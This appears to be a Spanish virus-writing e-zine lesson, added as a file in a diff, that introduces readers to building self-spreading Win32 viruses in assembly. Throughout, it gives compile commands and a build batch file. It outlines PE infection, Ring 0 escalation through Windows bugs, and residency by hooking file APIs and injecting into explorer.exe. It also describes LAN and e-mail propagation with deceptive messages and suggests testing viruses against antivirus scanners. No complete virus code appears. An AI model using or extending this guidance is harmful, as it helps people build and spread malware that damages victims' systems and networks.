@@ -1,0 +1,1356 @@
+
+
+                          ___...---'''EL CURSO DE VIRUS'''---...___
+
+By Vil Roach / Trenchcoat Legion - Infesting Your Heads
+
+Pues si señores , este es el curso de virus de nuestra amada revista, y cuando me refiero a curso
+es porque es un curso de verdad y vamos a empezar desde cero , avanzando poco a poco , y cuando 
+me refiero a virus, estoy hablando de virus de VERDAD,virus hechos en ensamblador y con capacidad
+de reproducirse en un sistema que use Win32;los unicos requerimientos para seguir el curso ,seran
+ un buen conocimiento del lenguaje Ensamblador Bajo Win32 , un compilador de Asm para Windows,por
+ ejemplo el tasm , el cual estara disponible en nuetra pagina , el archivo Win32.hlp , el cual 
+tambien estar pronto en nuestra pagina , algunas e-zines de virus , y mucha capacidad para 
+aprender nuevos conceptos e investigarlos mas a fondo . Por supuesto a medida que vayamos avanzan
+do y debido a la complejidad y vastitud del Sistema operarivo Windows , las colaboraciones de 
+todos ustedes , seran necesarias , para poder explorar y explicar las muchas tecnicas y conoci-
+mientos necesarios en el campo de los virus en Win32 .
+
+
+
+
+ Introduccion
+ ------------
+
+En esta primera entrega del curso , se presentaran las tecnicas viricas que tendremos que conocer
+para llevar a cabo la tarea de hacer un virus de windows , el tratamiento sera muy basico ya que
+el objetivo es simplemente que el lector sepa que existen y se interese en investigar en ellas ,
+obviamente en las proximas entregas del curso analizaremos cada aspecto mas detalladamente y tra-
+taremos de realizar un virus por capitulo que nos ejemplifique la teoria del curso , como esta 
+entrega del curso no tienen codigo de ejmplo , he decidido comentar dos muy pequeños y estupidos
+virus "companion" , que serviran simplemente para mostrar como es el coding en asm para windows ,
+y que serviran para aquellos que apenas empiezan a aprender Win32Asm . Si despues de leer los 
+sources alguien realiza su propio virus , me encantaria tenerlo para la proxima edicion de la 
+revista .
+
+Indice 
+------
+
+                     -Windows.
+
+                     -La Infection.
+
+                     -Ring 3 & Ring 0.
+
+                     -Residency en Win.
+
+                     -Redes!.
+
+                     -Payloads
+
+                     -Notas Finales
+
+
+
+
+
+Windows
+-------
+
+En esta seccion , enseñare las principales diferencias que tiene windows con el DOS , y tratare
+de aclarar los conceptos mas importantes y *Basicos* que se deben tener acerca de windows y su 
+prgramacion en bajo nivel.
+
+
+Los dos cambios mas radicales con respecto a la programacion en DOS son la sustitucion de las 
+interrupciones por funciones del Api de Windows , y el uso de punteros de 32 bits lo cual nos
+permite olvidarnos de los segmentos y offsets ,y tratar la memoria como una larga sucesion lineal
+de bytes , explico cada caso mas a fondo :
+
+En los tiempos de Dos cuando queriamos ejecutar una funcion del sistema operativo para abrir un 
+archivo , escribir una cadena de texto , dibujar en pantalla o lo que sea , usabamos las 
+interrupciones (que eran como una especie de funciones), y les pasabamos los parametros a traves
+de los registros, pero ahora en windows todo es diferente y cuando queramos usar una funcion del
+sistema operativo , debemos exportarla de la DLL que la proporciona (kernel.dll,user.dll,gdi.dll,
+etc) y pasarle los parametros a traves del stack , o sea con una serie de Push , en orden inverso
+a los parametros de la funcion , es decir la funcion MessageBox , cuya declaracion es :
+
+int MessageBox(
+
+    HWND hWnd,	// handle of owner window
+    LPCTSTR lpText,	// address of text in message box
+    LPCTSTR lpCaption,	// address of title of message box  
+    UINT uType 	// style of message box
+   );
+
+la llamamos de esta forma :
+
+push 0              ;style of message box
+push offset titulo  ;address of title of message box 
+push offset mensaje ;address of text in message box
+push NULL           ;handle of owner window
+Call MessageBox
+
+El otro cambio aun mas radical consiste en la forma en como el OS trata la memoria ; en DOS como
+todos los puntero eran de 16 bits , y con 16 bits solo podemos representar enteros de hasta
+65536 y al ser la memoria mucho mas que 65536 bytes , se necesitaba una forma de representar un 
+posicion en memoria con enteros de 16 bits , entonces se inventaros los segmentos, que consistian
+en dividir la memoria en 65536 segmentos de 65536 bytes , y de esta forma con dos enteros 
+podriamos direccionar mucha memoria , al usar uno como indicador del numero de segmento y al 
+otro a la posicion dentro de ese segmento , o sea que la posicion de una direccion; seg = 1000h y
+off = 346h seria igual a (65536 * seg) + off ; pero ahora nada de esto importa ya que al ser
+win32 de 32 bits , un solo entero nos permite direccionar hasta  4'294.967.296 bytes (+4 Gigas)
+convirtiendose la memoria del sistema en una sucesion lineal de 4'294.967.296 bytes sin necesidad
+usar offsets-segments , near jumps , ni nada de eso , una gran ventaja en pro de la facilidad,
+La forma en que Win95/98 organiza esta memoria es asi :
+
+
+Offset 00000000h Hasta 3FFFFFFFh = Application code and Data
+Offset 40000000h Hasta 7FFFFFFFh = Shared Memory 
+Offset 80000000h Hasta BFFFFFFFh = Kernel Drivers
+Offset C0000000h hasta FFFFFFFFh = Device Drivers 
+
+WinNT no diferencia entre los drivers del Kernel y  los Device Drivers , por lo tanto las ultimas
+dos secciones son una sola en WinNt
+El nombre que recibe esta gigantesca area de memoria en windows es la de Selector, a continuacion
+definire una serie de terminos que deben quedar claros para el correcto segumiento de los tuts :
+
+-Win32 =Tecnologia de software que abarca a los sitemas operativos de microsoft :Win 3.1 + Win32,
+        win9x,y Win Nt .
+
+-Win9x=Sistemas operativos de microsoft orientados al uso personal y posteriores a Win95 , es de-
+       cir Win95,Win98,WinME(Millenium Edition).Este y WinNt presentan ciertas diferencias a la
+       hora de su programacion , las cuales seran analizadas mas adelante .
+
+-Selector=Es un gran segmento de memoria formado por 2^32 bytes , y es la forma basica como win
+ 32 organiza su memoria , tambien llamada Flat Memory.
+
+-Modulo=Un modulo en Windows es un conjunto de Datos,Codigo,Recursos,etc que windows carga en me-
+        moria en una determinada direccion llamada Image Base . Un modulo tiene las sigiuientes 
+        cualidades :
+                                                   ----------
+        -Un modulo puede exportar funciones.
+        -Un modulo puede importar funciones.
+        -Un modulo en teoria puede ejecutarse sin importar o exportar funciones:
+
+        Asi que un modulo puede ser un archivo ejecutable,una dll que solo provee funciones o 
+        simplemente una serie de recursos para otra aplicacion .
+        Asi kernel.dll es un gran modulo que exporta las principales funciones de windows a 
+        todos los demas modulos que la importen.
+
+-Exportar Funcion=Capacidad de un modulo  de permitir que otros modulos usen codigo ejecutable ,
+                  el cual se enlaza en tiempo real, es decir cuando se ejecuta la aplicacion.
+
+-Importar Funcion=Capacidad de un modulo de usar funciones exportada por otros modulos, con un 
+                  enlace en tiempo real.
+
+-PE(Portable Executable)=Formato que define los archivos executables  de Win9X , WinNt , Y WinCE,
+                         se creo inicialmente para el NT y al ser este un SO que debe corre sobre
+                         plataformas , se le dio el apelativo de Portable,esta formado por una 
+                         serie de Headers,Tablas,y secciones. Este es el tema mas basico que debe
+                         mos conocer para realizar VIRUS para win , al ser el PE los host de nues
+                         tros bichos.
+
+-PE HeaderEncabezado con informacion de un PE.
+
+-Section=Division basica de un PE , generalmente el codigo se agrupa en una seccion , los datos
+         en otra , etc . Cada seccion tiene sus propios permisos de lectura/escritura.
+
+-Section Header=Encabezado con informacion de una section .
+
+-Image Base=Direccion de memoria donde se carga un PE para su ejecucion(IMPORTANTISIMO) .
+ ----- ----                         
+
+-VA(Virtual Address)=La VA es la direccion absoluta de un offset , pero cuando esta en memoria.
+
+-RVA(Relative Virtual Address)=La RVA es una direccion relativa a otra direccion en memoria gene-
+                               ralmente el Image Base , o cualquier otro offset Base. O sea que 
+                               la direccion absoluta de una RVA relativa al image bas seria = 
+                               Image Base + RVA
+
+-File Mapping=Tecnica usada en los ambientes Win32 , para la manipulacion de archivos , que 
+              consiste simplemente en desplegar los bytes de un archivo de igual forma en la memo
+              ria, y de esta forma manipularlos directamente , como si lo hicieramos en el disco.
+
+
+
+Compilando 
+
+EL compilador que se usara a lo largo del curso es el Tasm , El cual se encuentra, por motivos de
+Beta-Testing ;), en nuestra pagina , la forma de compilar sera la siguiente :
+
+-tasm32 /mx /m3 /z /q Virus.Asm
+
+Explicacion 
+
+/mx = Case Sensivity : Global, osea que todas las variables seran sensibles al uso de mayusculas/
+      minusculas . (messageboxa <> MessageBox)
+
+/m3 = Realiza 3 pasadas por el codigo .
+
+/z = Nos muestra la linea de codigo que tenga algun error .
+
+/q = Elimina los datos del OBJ no necesitados para el linking .
+
+-tlink32 -x /Tpe /aa /c Virus.Obj,,,import32.lib
+
+-x = Sin Archivos MAP .
+
+/Tpe = Genera un PE.
+
+/aa = Tipo de aplicaion igual a : Uses Windowing API.
+
+/c =  Sensibilidad a mayusculas/minusculas.
+
+import32.lib = Libreria con las declaraciones de las funciones del API de WIn32.
+
+-Pewrsec virus.exe
+
+El Pewrsec es una utilidad incluida el la ezine y permite al ejecutable escribir en la seccion 
+.code (El Tasm la crea como solo lectura).
+
+Lo mejor es hacer un bat que nos permita llamarlo con el nombre del virus , o sea :
+
+-----------------makvir.bat---------------------
+
+tasm32 /mx /m3 /z /q %1
+tlink32 -x /Tpe /aa /c %1,,,import32.lib
+Pewrsec %1
+
+------------------------------------------------
+
+Y la podriamos llamar asi : makvir mivirus
+
+Listo !
+
+Solo queda sugerir , que si no se conoce nada de asm en windows , leer el tutorial de kacimiro ,
+los codigos fuentes de algunos de mis articulos , leer los codigo de los virus que hay al final,
+y tratar de leer algun otro tutorial, para poder seguir los ejemplos y contribuir en ellos , e 
+internarse en el maravilloso mundo de la creacion de virus , y esta clase de virus si son virus 
+de verdad , algo que hasta el momento no mucha gente hace , y afortunadamente no esta muy popula-
+rizado .
+
+Creanme hacer un Buen Virus de Windows en ASM es algo de respeto , y debido a la corta historia 
+de los virus de Windows , aun existen muchas tecnicas por descubrir , y muchas posibilidades de
+innovar y ser alguien 33137;)
+
+
+
+-La Infeccion :
+ =============
+
+Esta es la parte mas fundamental en un virus , ya que si este no pudiera insertar su codigo en
+otros archivos , entonces no seria un virus ! Por eso este es quizas uno de los temas que mejor
+debemos manejar a la hora de programar nuestros virus , esta sera una simple introduccion , ya
+que el proximo capitulo estara completamente dedicado a este particular .
+
+A la hora de la infeccion en windows , lo mas importante que debemos conocer es el formato del PE
+es mas debemos conocerlo de los pies a la cabeza y tratar de comprender para que y como funcionan
+cada una de sus partes;pero los tipos de archivo que podemos infectar no son simplemente los .exe
+tambien podemos infectar : .scr (screensaver) que son lo mismo que un .exe, .ocx que son contro-
+les Active X similares al .exe , .dll que son lo mismo que un .exe con unas pequeñas diferencias,
+.cpl (elementos del panel de control) que son casi iguales al .exe , y varios mas , lo mejor es
+que se puede usar la misma rutina para infectar todos estos archivos modificandolas ta solo un 
+poco.
+
+En DOS cuando queriamos infectar un EXE simplemente debiamos cambiar algunos bytes del header 
+referntes al tamaño y a las relocaciones de memoria , agregar el codigo al final del archivo y 
+modificar el entrypoint y listo , teniamos un EXE infectado , pero en el PE el archivo no es una
+simple serie de bytes con un encabezado, en el PE todo los bytes estan divididos en secciones y
+cada seccion tiene su propio encabezado , asi que ahora deberemos modificar el Header del PE , y
+el header de la secion en la cual vayamos a agregar el codigo , esta seccion generalmente sera la
+ultima ya que es demasiado complicado volver a reubicar todas las secciones , luego modificamos
+el entrypoint o usamos alguna tecnica EPO y listo.
+
+Realmente todo esto escrito en ASM es mucho mas complicado , pero tampoco es imposible , asi que
+no se preocupen ya que todo el capitulo siguiente estara dedicado al formato PE , sus detalles y
+como infectarlo , como he dicho antes , este capitulo es simplemente un pequeño abrebocas para 
+que vayamos conociendo con que nos vamos a enfrentar y Principalmente para que olvidemos todas 
+esas tecnicas que usabamos en DOS!.
+
+Solo me queda comentar que la forma como trabajan los virus "companion" en windows , consiste en
+renombrar el ejecutable que vayamos a infectar con una extension .Bin y nuestro virus lo nombra-
+mos como el ejecutable , asi cuando el usuario ejecute el programa ejecutara nuestro virus real-
+mente , este buscara .exe para "infectar" , y luego ejecutara el .Bin , demasiado simple . pero
+tambien demasiado estupido y notable , quizas una buena idea seria extraer el icono del .bin y 
+ponerselo a nuestro virus , si se preguntan como se hace esto pues simplemente consulte el mara-
+villoso Win32.Hlp.
+
+Por ultimo solo me queda recomendar que se consulte un documento acerca del PE como puede ser 
+Pe.Txt por Micheal J. O'Leary , e incluso consultar un tutorial de PE-Infection , como los de
+Lord Julus en su VX-Stacy #1 , o el de Qozah en la 29A #3 .
+
+Ring 3 & Ring 0   
+---- - - ---- - 
+
+Los Programas para  los procesadores X86 de intel , se supone que pueden correr en 4 niveles con
+distintos permisos esto son :
+
+-Ring 3
+
+-Ring 2
+
+-Ring 1
+
+-Ring 0
+
+Siendo Ring 0 el que nos permite hacer lo que queramos con la memoria y el procesador , y siendo
+Ring 3 el mas limitado de todos .
+
+En Win32 solo existen ring 3 y ring 0 ,de esta forma las aplicaciones de windows corren en ring 3
+y solo pueden hacer lo que les permita el API de windows , por ejemplo no pueden ejecutar 
+interrupciones , no pueden escribir en los puertos , no se puede acceder a ciertas areas de 
+memoria ,etc ; en cambio el Kernel de windows y los device drivers corren en Ring 0 lo cual nos
+permite realizar cualquier cosa que queramos , como si estuvieramos programando en el antiguo DOS
+
+Asi que de aqui se derivan una de las clasificaciones de los virus de Win32 , Aquellos que usan 
+el API de windows y por lo tanto corren en Ring 3 , y los que se ejecutan en Ring 0.
+
+Pero si nuestros virus infectan .exe , y estos se ejecutan en ring 3 , como diablos hacemos para
+ejecutar codigo en Ring 0 ? ,Pues simplemente nos aprovechamos de algun Bug de WIndows , para 
+pasar a Ring 0, simple pero tiene un gran problema , que si windows descubre este bug en Win95 , 
+entonces lo arreglara para Win98 , y nuestro virus reduciria su campo de accion , aunque aun asi
+hacer un virs en Ring 0 resulta entretenido , ya que tenemos total control sobre el computador ,
+lo cual nos permite hacer un muy buen virus , y si no vean al virus CIH en su variante Chernobyl,
+el cual causo grandes problemas ultimamente.
+
+Pero los exploits no son la unica posibilidad para correr en Ring 0,existen otras dos posibilida-
+des y estas son :
+
+-Los VXD (Controlador De Dispositivo Virtual) . Un Archivo .vxd , es como una especie de dll , pe
+ ro corriendo en RIng 0 , y se usa para hacer drivers para dispositivos del PC , asi que lo que 
+ hariamos seria , que nuestro virus cargara todo el vxd en su interior , lo escribiera en disco ,
+ y luego la regitraria para que se ejcutara al iniciarse windows, el problema con esta tecnica es
+ el tamaño del virus .
+
+-La otra tecnica fue descubierta por Griyo/29A. Al ser un archivo vxd un DLL que corre en Ring 0,
+ este exporta tambien funciones a otros VXD , y si lo hace asi , no podria tambien exportar fun-
+ ciones a una dll normal? , pues si que lo hace , y lo hace mediante una API que exporta Kernel32
+ .DLL llamada VxDCall , la cual no se exporta por el nombre , asi que no se molesten en buscarla,
+ esta maravillosa api nos permite llamar a decenas de funciones exportadas por VMM.VXD , y por 
+ VWIN32.VXD , permitiendonos hasta ejecutar la Int 21h y usar funciones de archivos y memoria . 
+ Como vemos esta es una gran tecnica , pero solo funciona en Win9X , si alguien quiere saber
+ mas de esta tecnica , le recomiendo que consulte el virus HPS de Griyo/29A
+
+Los primeros virus que realizaremos seran en Ring 3 , pero conforme se va avanzando seria conve-
+niente crear virus de Ring 0 , e investigar nuevas formas de llegar a Ring 0 .
+
+
+Residency en Win 
+--------- -- ---
+
+Este es quiza una de las principales que deben tener los virus de un nivel medio : la residencia
+en memoria , pero como todo lo demas , en windows no podemos usar los metodos de DOS , nada de 
+interupciones , de MCB , ni nada de nada . Pero no se preocupen ya que desde el principio muchos
+escritores de virus como Jacky Qwerty (THE MAN!) , lord julus , griyo , han investigado y 
+encontrado formas de que nuestros virus se queden residentes en memoria y puedan tener hooks de 
+las API mas importantes .
+
+Antes de exponer los mas conocidos metodos de residency aclarare que es un Hook , un hook consis-
+te simplemente en hacer que nuestro codigo se ejecute siempre que windows vaya a ejecutar una 
+funcion , de esta forma podemos hacer por ejemplo que cada vez que windows ejecute un programa 
+con la funcion CreateProcess , nuestro codigo se ejcutara en su lugar ! , inmediatemente nuestro
+codigo infectaria el archivo a ejecutarse , y luego ejecutaria la  CreateProcess original , infec
+tando de esta manera todos los programas que el usuario ejecute (!).  
+
+Como veremos a continuacion los metodos de residencia se dividen basicamente en 2 , los que se
+istalan como hooks de ciertas APIs , y los que se quedan en memoria para ejecutarse cada cierto 
+tiempo y dedicarse a infectar archivos (como una thread).
+
+Estos son solo algunos de los metodos de residencia usados actualmente , todos trabajan en Ring 3
+y se quedan por fuera todos los metodos de residencia en Ring 0 , ya que estos requeiren un mayor
+conocimento de windows en *bajo* nivel :
+
+
+-Thread residency
+
+Este es el metodo mas simple y el mas inutil de todos , consiste simplemente en crear una thread
+o un fiber antes de retornarle el control al host ; el proceso creado usaria un timer o algo asi
+para infectar archivos cada cierto tiempo,el gran problema con este tipo de residencia es que al
+finalizar el proceso padre (se cierra el programa host) , todos los procesos hijos terminan 
+tambien , incluida la thread que creamos, una mejora que quizas se podria hacer seria infectar 
+ciertos programas que se ejcutan casi todo el tiempo , por ejemplo el GetRightMonitor , el ICQ,
+el monitor de recursos , o cualquier otro.
+
+
+-Spawn Method
+
+Este metodo realmente es una evolucion del anterior , ya que se basa tambien en crear una thread
+que se ejecute cada cierto tiempo , pero con la diferencia que el proceso lo creara un ejecutable
+que nuestro virus grabara al disco , y que se registrara para como un servicio para que windows 
+lo ejecute cada que se inicie . Las opciones para escribir el ejecutable en el disco son varias 
+por ejemplo en el virus Enumero By Virogen este tenia grabado una segunda copia del virus (PE)
+en su cuerpo y simplemente lo escribia al disco ,  Jacky Qwerty uso otra tecnica que consistia en
+grabar el host en el directorio del windows , con el entrypoint modificado pero con la diferencia
+que el en esta segunda copia el host nunca recobra el control ,y finalmente Lord Julus uso un 
+metodo similar que consistia en escribir el PE Host pero desde la memoria y no desde el disco ,
+algo mucho mas elegante y sofisticado ,otra forma que se me acba de ocurrir seria hacer una copia
+de un programa pequeño de windows como WinVer.Exe (4Kb), y modificar esta copia para qie se 
+ejcute nuestro codigo , y luego registrarla como servicio .Finalmente decir que este metodo fue 
+muy usado antiguamente , pero aunque ya perdio vigencia, sigue siendo una forma aceptable de ir 
+residente a memoria. 
+
+
+-Per Process residency
+
+este es quizas el metodo mas usado por los ultimos virus ya que tien grandes ventajas pero 
+tambien tiene ciertos inconvenintes .
+Para entender como trabaja este metodo lo primero que debemos saber es que las funciones que un 
+PE importa de otras DLL se guardan en una parte del PE Header llamda Imports Table ; asi que cuan
+do windows ejecuta un archivo PE , mira todas las import y las enlaza en tiempo real con la 
+direccion que tenga cada funcion en memoria , por ejmplo si el programa usa la funcion 
+CreateProcess de Kernel.Dll, windows busca la direccion de esa funcion dentro del area de exports
+de kernel.dll , y luego escribe esa dirrecion en la memoria del PE , ahora cuando el codigo llame
+esta funcion ira a la direccion indicada de kernel.dll , pero que pasa si nosotros luego de que 
+el host se carga en memoria cambiamos la direccion a la que apunta la tabla de imports para que 
+apunte a una funcion nuestra , pues muy sencillo que cada vez que el programa por ejemplo llame a
+la funcion CreateProcess , primero llamara a una funcion nuestra , asi que tendriamos un Hook,
+en esta funcion podriamos ver si el archivo a crear es un Exe , y lo infectariamos normalmente 
+luego lo cerrariamos , y llamariamos a la direccion que estaba en la tabla de imports la cual 
+guardamos anteriormente , o al menos eso espero ;) , pero si queremos que la infeccion sea exito-
+sa debemos hookear muchas mas apis , por ejemplo :
+
+CopyFile
+CopyFileEx
+CreateDirectory
+CreateDirectoryEx
+CreateFile
+CreateIoCompletionPort
+DeleteFile
+FindClose
+FindCloseChangeNotification
+FindFirstChangeNotification
+FindFirstFile
+FindFirstFileEx
+FindNextChangeNotification
+FindNextFile
+GetBinaryType
+GetCompressedFileSize
+GetCurrentDirectory
+GetDiskFreeSpace
+GetDiskFreeSpaceEx
+GetDriveType
+
+y como estas hay muchas mas ; espero que todo haya quedado claro , pero como ya he dicho mas 
+tarde este tema se tratara mas a fondo y con codigo ejemplo (!) , en un articulo hecho por mi o
+ojala por algunos de ustedes que se decida a leer y aprender !.
+
+Este sistema tiene dos desventajas principalmente , la primera es que muchoas programas no 
+exportan todos sus APIs en tiempo de compilcaion y mas bien usan la funcion GetProcAddress la 
+cual nos devuelve la ubicacion de una API especificada ; pero como algunos de ustedes ya lo han 
+pensado , la solucion es muy facil , simplemente le hacemos un Hook a la funcion GetProcAddress 
+para que devuelva la direccion de nuestra funcion falsa , obviamente en caso de que esten pidien-
+do la direccion de una de las funciones que nos interesan.
+
+El otro inconveniente es que muy pocas aplicaciones trabajan con archivos .exe, por ejemplo no me
+imagino para que necesitaria abrir un .exe el solitario de winodws , asi que debemos apoyar este
+metodo de infeccion con otros metodos,otra muy buena idea seria por ejemplo infectar el archivo
+explorer.exe o algun otro programa que trabaje con archivos , otro punto que debemos tener en 
+cuenta es realizar el mayor numero posible de hooks.
+
+Nota = al explorer.exe no lo podemos infectar directamente ya que este esta cargado en memoria
+todo el tiempo , lo que podemos hacer es crear una copia del archivo explorer.exe , hacerle las
+modificaciones pertinentes y luego escribir escribir en el autoexec.bat un comando que remplaze 
+el antiguo explorer.exe con nuestro nuevo y "mejorado" ;)  explorer.exe .
+
+
+-Explorer In memory infection
+
+Esta es una tecnica muy interesante que ha sido tratada por Griyo/29A en un extenso tutorial , la
+verdad es que cuando la conoci la encontre muy similar en CONCEPTO a la forma como nos poniamos
+residentes en DOS ; el proceso se podria resumir de esta forma :
+
+·Cuando se ejecuta el virus y antes de cederle al control al host , reservamos la memoria que ne-
+ cesite el virus con las funciones  CreateFileMappingA y MapViewOfFile , estas crean un tipo 
+ especial de memoria la cual puede ser usada y compartida or otros procesos .
+
+·Luego debemos buscar el proceso Explorer.Exe , y establecer su Image Base para poder acceder a
+ su area de memoria .
+
+·Luego con las funciones ReadProcessMemory y WriteProcessMemory , procedemos a buscar un espacio
+ vacio en el proceso de explorer , y luego insertamos una pequeña rutina de codigo que nos permita
+ que el proceso explorer vea o este conectado con la memoria de nuestro virus . De esta forma 
+ cuando el host termine de ejcutarse la memoria no se liberar ya que windows creera que 
+ explorer.exe esta usando el codigo del virus .
+
+·Finalmente instalamos un Hook en el explorer.exe que llame al codigo reservado anteriormente el
+ cual solo se liberara cuando finalize el proceso del explorer.exe .
+
+Creo que esta es una de las tecnicas mas bellas desde el punto de vista del conocimiento del OS,
+como siempre en un proximo articulo se tratara esta tecnica mucho mas a fondo .
+
+ 
+Realmente existen muchas mas tecnicas para quedar residentes , por ejemplo jugar con los imports 
+del kernel32.dll , o cualquier dll , tambien existen muchas mas tecnicas para quedar residentes
+en Ring 0 , pero siendo el objetivo de este capitulo meramente introductorio no se trataran mas 
+tecnicas .
+
+
+
+
+Redes!
+------
+
+Este es quizauno de los aspectos del windows que mas pueden ser util y fascinar a un escritor de
+virus , la capacidad nativa de windows de trabajar en "cualquier" tipo de redes , sin necesidad
+de tener incompatibilidades de ningun tipo ; si nuestro virus tiene la capacidad de usar las 
+redes de computacion como una ayuda para su expansion t6endra muchisimos puntos a favor ; hoy en
+dia las tecnicas viricas de redes se dividen basicamente en dos :
+
+-Trabajo con Redes Locales (LANs)
+
+-Trabajo con Internet
+
+Quizas la segunda suena muchisimo mas emocionante, pero no debemos olvidar que en muchas empresas
+tiene gigantescas redes de copmutadores , y con las tecnicas adecuadas podriamos infectar todos 
+los computadores de una red , y la forma de hacer esto es la siguiente :
+
+Podemos usar la funcion GetLogicalDriveStrings la cual nos devuelve una lista con cadenas que 
+especifican todos los drives que tiene el sistema y en con las cuales podemos trabajar como si 
+fuera un disco normal ;) , pero como sabemos si un drive es remoto ? pues simple usamos la 
+funcion  GetDriveType con la cadena que queramos investigar y si nos devuelve DRIVE_REMOTE 
+entonces estamod trabajando con un drive de una red. Tambien podemos usar las funciones :
+
+·WNetOpenEnum
+·WNetEnumResource
+·WNetCloseEnum  
+
+las cuales nos permiten conocer todos los recursos a los que esta conectado el computador asi no
+los halla mapeado como drives , simplemente debemos pasarle los parametros adecuados a las 
+funciones , las cuales como todas as que he nomvrado se encuentran documentadas en Win32.Hlp
+Creo que un virus provisto con estas funciones pueden dmejorar mucho sus capacidades de infeccion
+ya que por algun golpe de suerte este podria caer digamos en alguna red gigantesca de una empresa
+y hacer historia .
+
+
+Con respecto a internet las posibilidades se multiplican y de igual forma las victimas ;) , hasta
+el dia de hoy los virus han usado principalmnte las siguientes tecnicas :
+
+
+·Algunos virus , y muchos worms usan la libreria mapi.dll , esta es una libreria que nos permite
+ conectarnos a un servidor de correo electronico y mandar un e-mail a la direccion que queramos,
+ un e-mail que tendria un archivo infectado adjunto , sencillo pero eficaz. Las funcione que nos 
+ permiten realizar esta tarea son :
+
+  -MAPILogOn
+  -MAPISendMail
+  -MAPIReadMail
+  -MAPILogOff
+
+
+Una buena idea es leer los mensajes de correo electronico que el usuario no halla respondido 
+y responderle con nuestro particular e-mail ;) , tambien debemos ponerle un subject y un content
+creible , como si fuera un email realmnte mandado por una persona , lo mejor es tener cerca de 
+30 o 40 distintods e irlos intercambiando .
+
+El principal problema de esta tecnica es la de conseguir los e-mails a los cuales  mandar nuestro
+virus , y los worms que se han hecho hasta ahora han usado principalmnte la tecnica de ver los 
+emilas sin responder , y tambien la de buscar en los archivos html, etiquetas "mailto:" y extraer
+el email.
+
+Esta es una tecnica muy usada por los worms , y creo que muy pocos virus la han usado hasta el mo
+mento, pero aun asi resulta facil de hacer y muy interesante ya que es una tecnica poco explorada
+se pueden hacer muchas innovaciones.
+
+·Una tecnica muy usada ultimamente y sobre todo por virus hechos en HLL (HIgh Level Lenguage) con
+ siste en usar programas externos , con el fin de la propagacion , por ejemplo el virus/worm 
+ Melissa usaba el MS-OutLook como cliente de correo electronico y se enviaba a todos los 
+ contactos,el worm I LOVE YOU , tambien lo hacia , y numeros virus hechos por grandes coders como
+ Vecna o Billy Belcebu usan el mirc junto con un pequeño Script.Ini para enviar un dropper de su
+ virus por el iIRC, y lo mejor es que nunca faltara el estupido que ejecute el archivo , asi que 
+ no perdemos nada. Esta es una de las tecnicas mas faciles de usar pero no por ello es menos efec
+ tiva.Si se quiere mas informacion al respecto les recomiendo mi articulo sobre Worms De Mirc.
+
+·La tercera posibilidad es quiza la mas excitante de todas , y consiste en programar el 
+ Winsock.dll para intercambiar datos por internet con los computadores que quramos y con el
+ protocolo que queramos , realmente las posibilidades son muchas , y si no creen o no se les
+ ocurre nada ahi les van algunos ejemplos :
+ 
+ *I-worm.Happy : Este worm fue uno de los primeros (o el primero?)que se conectaba directamente
+                 al servidor de email sin usar mapi.dll (Hacia algo parecido a la tecnica de 
+                 Fake Mail) , usando ordenes como helo , to , etc. Lo mas interesante del worm
+                 era su forma de conseguir direcciones de e-mail, consistia en hookear la 
+                 funcion send() de WinSock.dll , y cuando se FUERA A ENVIAR un e-mail , miraba
+                 la direccion y se mandaba a ella  luego mandaba el e-mail  original (!).
+
+ *Win95.Babylonia : Exte si que es un señor virus , fue programado por Vecna y causo gran sensa-
+                    cion entre el publico en general ya que usaba funciones de winsock para 
+                    implementar un motor que permitia hacer un upgrade al virus en linea simple-
+                    mente buscando en una URL definida , modulos o plug-ins para agregarese , 
+                    simplemente impresionante!. Otra particularidad interesante era su capacidad
+                    de agregarse a los e-mails salientes de la maquina , sin tener que enviar 
+                    otro e-mail , sino que creando un attchment con el droper del virus.
+
+ *TeddyBear : Este es aun mas impresionante ya que es una combinacion del Netbus , Babylonia y 
+              y Bot de Irc , su forma de trabajar era comunicarse con su amo por medio de un 
+              servidor IRC, y luego hacer lo que este amo le ordenara , pudiendo manejar toda la
+              maquina remotamente; realmente este es uno de los Virus mas interesantes que he 
+              visto y les recomiendo que le peguen una ojeada , esta en la 29A #4.
+
+
+ Como se puede ver la mayoria de tecnicas en este campo resultan muy interesante y entretenidas
+ y lo mejor de todo es que son el futuro ya que Internet tiende a ser mas y mas parte del concep
+ to mismo de computador ; otra cosa buena es que todavia queda mucho por investigar y aprender
+ en este campo , asi que manos a la obra y a unas cuantas RFC .
+
+ Nota : por ejemplo una pequeña idea que se me ha ocurrido : imaginense un virus que atake a 
+ WinNt y que tenga la capacidad de interceptar e infectar cualquier archivo saliente por el 
+ puerto 80 (WWW) y FTP (21), ahora piensen lo que pasaria si infectar el servidor donde corre
+ una conocida pagina web , imaginese quien sospecharia de un .XML de microsoft.com o de un .exe
+ de download.com , impresionante no les parece ; lastima no tener un WinNt :(
+
+
+Payloads
+--------
+
+Yo creo que el payload es la parte mas personal de un virus y la que mas nos habla sobre quien y
+como es el autor , asi que no me pondre  mostrar payloads ya creadas , lo que resaltare es el 
+gran universo de posibilidades que se nos habre en windows para las payloads , ya podemos usar 
+graficos facilmente , graficos 3D,sonidos y videos(MMSytem), podemos abrir un archivo facilmente
+y vamos a poder programar facilmente Internet!.
+
+Asi que hay les muestro alguna apis que podrian resultar interesantes en la programacion de 
+payloads :
+
+-MMsystem.dll (Multimedia,sonido,video,etc).
+
+-OpenGl (graficos 3D)
+
+-DirectX (Muchisimas Apis enfocadas en la multimedia)
+
+-Cards.Dll (Dibujado de cartas).
+
+-Winsock (Internet = Paraiso:Atakes de denial of service,scanneo de IPs,Robo de informacion,etc)
+
+-Laque se le ocurra.Dll
+
+
+
+Notas Finales
+-------------
+
+Si alguien quiere empezar a investigar de una vez les tengo los siguientes recomendados :
+
+*Paginas Web :
+
+-www.coderz.net\vtc : Ahi encontraran la mayor cantidad de enlaces a paginas web de virus-makers,
+                     grupos,coleccionistas e incluso compañias AV; Tambien cuenta con una 
+                     excelente seleccion de utilidades que todos deberian bajar ya . Por cierto
+                     esta es la pagina de VirusBuster uno de los mas famosos coleccionostas de 
+                     virus .
+
+-www.wotsit.org : Excelente pagina para programadores con una gran cantidad de documentos 
+                 tecnicos organizados por su topico. Por ejemplo tiene dos extensos documentos 
+                 acerca de el formato .Lnk (Acceso directo de windows).
+
+*Antivirus (para testear sus virus) :
+
+-Dr.Web : El mejor scanner de Win32.
+
+*Programas :
+
+-Tasm  5.0 o mayor
+
+-Pewrsec 
+
+-Softice 3.4 o mayor
+
+-Ida 
+
+-Vdat : la mejor enciclopedia acerca de virus 
+
+
+*E-zines (buscaer sus urls en la pagina de VirusBuster) :
+
+-29A #3 y 4 .
+
